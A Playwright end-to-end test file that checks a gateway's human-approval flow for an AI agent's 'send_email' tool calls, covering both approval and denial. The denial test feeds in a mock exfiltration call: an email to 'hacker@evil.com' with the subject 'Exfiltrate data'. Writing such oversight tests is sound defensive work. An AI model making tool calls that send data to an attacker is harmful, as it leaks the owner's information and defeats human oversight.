/**
 * Full approval flow E2E test:
 * 1. Create a policy requiring human approval for 'send_email'
 * 2. Agent calls send_email → gateway creates ApprovalRequest
 * 3. Dashboard shows the pending approval
 * 4. Human approves → agent call unblocks (returns 200)
 */

import { test, expect } from '@playwright/test';
import {
  setupAdmin,
  login,
  createPolicy,
  createApiKey,
  startSession,
  intercept,
  TEST_ADMIN_EMAIL,
  TEST_ADMIN_PASSWORD,
} from '../helpers';

test.describe('Human Approval Flow', () => {
  let token: string;
  let policyId: string;
  let apiKeyValue: string;

  test.beforeAll(async () => {
    token = await setupAdmin();

    policyId = await createPolicy(token, `E2E Approval Policy ${Date.now()}`, {
      blockedTools: [],
      allowedDomains: [],
      useSupervisor: false,
      requireApproval: {
        always: false,
        forTools: ['send_email'],
        approvalTimeoutSeconds: 60,   // shorter for tests
        timeoutBehavior: 'deny',
      },
    });

    const keyData = await createApiKey(token, 'E2E Test Key', policyId);
    apiKeyValue = keyData.key;
  });

  test('pending approval appears in dashboard and can be approved', async ({ page }) => {
    // Log in to dashboard
    await page.goto('/login');
    await page.getByPlaceholder(/email/i).fill(TEST_ADMIN_EMAIL);
    await page.getByPlaceholder(/password/i).fill(TEST_ADMIN_PASSWORD);
    await page.getByRole('button', { name: /sign in/i }).click();
    await page.waitForURL('/');

    // Start a gateway session
    const sessionId = await startSession(apiKeyValue, 'e2e-agent');

    // Fire the intercept call in the background (it will block waiting for approval)
    const interceptPromise = intercept(apiKeyValue, sessionId, 'send_email', {
      to: 'cto@company.com',
      subject: 'Quarterly Report',
      body: 'Here are the Q1 results...',
    });

    // Navigate to approvals page
    await page.goto('/approvals');
    await expect(page.getByRole('heading', { name: /approvals/i })).toBeVisible();

    // Wait for the pending approval to appear (may take a moment to propagate)
    await expect(page.getByText(/send_email/i)).toBeVisible({ timeout: 10_000 });
    await expect(page.getByText(/pending/i, { exact: false })).toBeVisible();

    // Approve it
    await page.getByRole('button', { name: /approve/i }).first().click();

    // The intercept call should now resolve as allowed
    const result = await interceptPromise;
    expect(result.status).toBe(200);
    expect(result.body.decision).toBe('APPROVED_BY_HUMAN');
  });

  test('denied approval returns 403 from gateway', async ({ page }) => {
    // Log in
    await page.goto('/login');
    await page.getByPlaceholder(/email/i).fill(TEST_ADMIN_EMAIL);
    await page.getByPlaceholder(/password/i).fill(TEST_ADMIN_PASSWORD);
    await page.getByRole('button', { name: /sign in/i }).click();
    await page.waitForURL('/');

    const sessionId = await startSession(apiKeyValue, 'e2e-agent-2');

    const interceptPromise = intercept(apiKeyValue, sessionId, 'send_email', {
      to: 'hacker@evil.com',
      subject: 'Exfiltrate data',
      body: 'All your base...',
    });

    await page.goto('/approvals');
    await expect(page.getByText(/send_email/i)).toBeVisible({ timeout: 10_000 });

    // Deny it
    await page.getByRole('button', { name: /deny/i }).first().click();

    const result = await interceptPromise;
    expect(result.status).toBe(403);
    expect(result.body.decision).toBe('DENIED_BY_HUMAN');
  });
});
